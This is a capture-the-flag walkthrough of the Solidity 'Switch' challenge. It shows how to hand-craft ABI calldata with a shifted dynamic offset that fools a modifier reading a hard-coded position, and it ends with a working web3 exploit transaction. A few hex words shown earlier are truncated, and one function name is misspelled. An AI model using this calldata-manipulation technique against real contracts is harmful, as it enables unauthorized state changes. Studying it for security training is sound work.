# Switch

## Challenge Description

Just have to flip the switch. Can't be that hard, right?

##### Things that might help:

Understanding how `CALLDATA` is encoded.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        bytes32[1] memory selector;
        assembly {
            calldatacopy(selector, 68, 4)
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

## Challenge Solution Walkthrough

In this challenge, the goal is to set the `switchOn` variable to `true`. The `turnSwitchOn()` function can achieve this, but there is a modifier that restricts direct calls to this function. The `onlyThis()` modifier allows only the contract itself to execute the function. To work around this limitation, we can use the `flipSwitch()` function, which takes a `_data` parameter and calls the contract with that data. The challenge is to construct the `_data` such that it calls the `turnSwitchOn()` function.

Initially, we attempt to call the `turnSwitchOn()` function from `flipSwitch()` by encoding the function signature using:

```javascript
> const turnSwitchOnSelector = await web3.eth.abi.encodeFunctionSignature("turnSwitchOn()");
> await contract.flipSwitch(turnSwitchOnSelector)
```

However, this transaction reverts with the error message "execution reverted: Can only call the turnOffSwitch function." This error is triggered by the `onlyOff()` modifier. Looking at the `onlyOff()` modifier, we can see that it copies the `calldata` and checks bytes 68 to 72 for the function selector, expecting it to match the selector of the `turnSwitchOff()` function.

Examining the `calldata` from the `contract.flipSwitch(turnSwitchOnSelector)` transaction, we find:

```
0x30c13ade000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000476227e12000000000000000000000000000000000000000000000000000000
```

Analyzing the `calldata` structure, we observe:

-   The first 4 bytes (8 characters) represent the function selector of `flipSwitch()`:

    ```
    0x30c13ade
    ```

-   The next 32 bytes (64 characters) indicate the offset of the `_data` input, showing where the data begins in the `calldata`:

    ```
    0x00000000000000000000000000000000000000000000000000000000000020
    ```

-   Following that, the next 32 bytes (64 characters) represent the length of the `_data`:

    ```
    0x00000000000000000000000000000000000000000000000000000000000004
    ```

​ In this case, the data length is 4 bytes, which corresponds to another function selector.

-   Finally, the last 32 bytes (64 characters) contain the value of the `_data`:

    ```
    0x76227e1200000000000000000000000000000000000000000000000000000
    ```

    Here, the value corresponds to the function selector of the `turnSwitchOn()` function.

We notice that bytes 68 to 72 in the `calldata` represent the function selector of `turnSwitchOn()`, while the modifier expects the function selector of `turnSwitchOff()` to pass. Our task is to manually edit this `calldata` to change the function selector to `turnSwitchOff()`, while still ensuring that the function actually calls `turnSwitchOn()`.

To accomplish this, we obtain the function selectors of all the functions:

```javascript
> await web3.eth.abi.encodeFunctionSignature("flipSwitch(bytes)")
< '0x30c13ade'
> await web3.eth.abi.encodeFunctionSignature("turnSwitchOn()")
< '0x76227e12'
> await web3.eth.abi.encodeFunctionSignature("turnSwitchOff()")
< '0x20606e15'
```

With this information, we construct the `calldata` manually:

-   The first 4 bytes (8 characters) represent the function selector of `flipSwitch()`:

    ```solidity
    0x30c13ade
    ```

-   The next 32 bytes (64 characters) denote the offset, which indicates that the data starts at byte 96. Normally, the offset would be `0x20`, indicating that the data starts 32 bytes later (4 bytes for `flipSwitch()` function selector and 32 bytes for the offset). However, we modify this to `0x60` (96 in decimal) to start the data at byte 96. Thus, the next 32 bytes are:

    ```solidity
    0x0000000000000000000000000000000000000000000000000000000000000060
    ```

-   Since the data starts at byte 96, bytes 36 to 95 can contain any value. However, to pass the modifier, bytes 68 to 72 should be set to the function selector of `turnSwitchOff()`. Hence, the next 64 bytes (128 characters) are:

    ```solidity
    0x000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000
    ```

-   The data starts here. For the next 32 bytes, we specify the length of the data, which is 4 bytes since it corresponds to the function selector of `turnOnSwitch()`. Thus, we set the following 32 bytes (64 characters) as:

    ```solidity
    0000000000000000000000000000000000000000000000000000000000000004
    ```

-   Lastly, for the final 32 bytes (64 characters), we assign the function selector of `turnSwitchOn()`:

    ```solidity
    0x76227e1200000000000000000000000000000000000000000000000000000000
    ```

The final `calldata` is:

```solidity
0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
```

Let's analyze the `calldata` structure to ensure a complete understanding. Here's a breakdown:

1. The first 4 bytes represent the function selector of the `flipSwitch()` function.
2. The next 32 bytes indicate the offset, which sets the starting position of the data.
3. From byte number 96, there are 32 bytes that represent the length of the data, which is 4 bytes.
4. The first 4 bytes within the next 32 bytes contain the function selector of the `turnSwitchOn()` function. As a result, this `calldata` will call the `turnSwitchOn()` function.
5. Bytes 68 to 72 contain the function selector of `turnSwitchOff()`, allowing the modifier to be satisfied.

Now, we can send the transaction to the contract using this modified `calldata`. Here's an example:

```javascript
> const data = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
> await web3.eth.sendTransaction({ from: player, to: contract.address, data: data })
```

By executing the following code, we can verify that the `switchOn` Boolean has been set to `true`.

```javascript
> await contract.switchOn() == true
< true
```

## Challenge Description After Solving

Assuming positions in `CALLDATA` with dynamic types can be erroneous, especially when using hard-coded `CALLDATA` positions.
